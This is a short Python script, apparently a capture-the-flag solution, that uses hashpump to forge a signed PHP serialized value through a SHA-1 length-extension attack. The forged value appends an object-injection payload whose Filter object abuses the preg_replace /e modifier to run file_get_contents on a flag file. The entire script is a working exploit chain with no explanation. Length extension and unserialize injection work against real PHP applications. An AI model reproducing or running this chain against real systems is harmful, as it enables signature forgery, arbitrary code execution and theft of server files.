import subprocess
original_hash = '2141b332222df459fd212440824a35e63d37ef69'
original_data = 'b:1;'
     
#appended_data = '\\nO:4:"Post":3:{s:8:"*title";s:53:"title";s:7:"*text";s:44:"file_get_contents(\'/home/daedalus/flag.txt\')";s:10:"*filters";O:6:"Filter":2:{s:10:"*pattern";s:8:"/^(.*)/e";s:7:"*repl";s:15:"strtoupper(\\\\1)";}}'
appended_data = 'b:0;O:4:"Post":3:{s:8:"*title";s:53:"title";s:7:"*text";s:44:"file_get_contents(\'/home/daedalus/flag.txt\')";s:10:"*filters";O:6:"Filter":2:{s:10:"*pattern";s:8:"/^(.*)/e";s:7:"*repl";s:15:"strtoupper(\\\\1)";}}'
key_length = 8
     
print original_hash
print original_data
print appended_data
     
command = "hashpump -s '{}' -d '{}' -a '{}' -k '{}'".format(original_hash,
                                                                original_data,
                                                                appended_data,
                                                                key_length)
print command
print subprocess.Popen(command, shell=True)
